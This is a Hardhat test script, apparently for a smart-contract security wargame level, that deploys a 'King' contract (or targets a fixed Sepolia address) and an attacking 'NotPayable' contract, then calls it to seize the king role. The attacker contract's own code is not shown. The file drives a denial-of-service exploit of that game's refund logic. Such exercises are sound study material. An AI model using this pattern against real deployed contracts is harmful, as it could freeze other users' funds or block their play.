import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { King__factory, NotPayable__factory } from "../../typechain-types/factories/security/King.sol";
import { King, NotPayable } from "../../typechain-types/security/King.sol";
import { createWallet, tx2contract } from "../sdk";
const hre = require('hardhat');

describe("Hack", function () {
  this.timeout(6000000);

  let signers : SignerWithAddress[]
  let owner: SignerWithAddress;
  let c : King
  let hc : NotPayable

  before(async () => {
    signers = await ethers.getSigners()
    owner = signers[0];
    console.log("owner : ", owner.address)

  });

  let CONTRACT_ADDR : string
  it("Deploy Contract", async function () {
		if (hre.hardhatArguments.network == undefined) {
      c = await new King__factory(owner).deploy({value : '1000000000000000'})
      console.log("c address : ", c.address)
      CONTRACT_ADDR = c.address
    } else {
      CONTRACT_ADDR = "0x13e9DB50515AbB781380CE6DEcf90dee3C0892C8"
    }
  });

  it("Deploy HackContract", async function () {
      hc = await new NotPayable__factory(owner).deploy(CONTRACT_ADDR, {value : '5000000000000000'})
      console.log("hc address : ", hc.address)
      console.log("balance : ", await hc.contractBalance())

  });

  it("hack tx", async function () {
    let signer = owner

    async function tx(
      amount : string
    ) {
      
      const abi = [
        "function sendEther(uint) external"
      ]
    
      const TX_VALUE = ethers.utils.parseEther("0")
      const TX_GAS_LIMIT = BigInt(10000000)
      const reciept = await tx2contract(
        hc.address,
        abi,
        "sendEther",
        [amount],
        signer,
        TX_VALUE.toBigInt(),
        TX_GAS_LIMIT
      )
      console.log("reciept : ", reciept)
    }

    await tx('1500000000000000')
  
    //await tx('2000000000000000')
		// if (hre.hardhatArguments.network == undefined) {
    //   expect(await c.king()).eq(signer.address)
    // }
  });

});



// Test : yarn hardhat test test/security/*.ts --network sepolia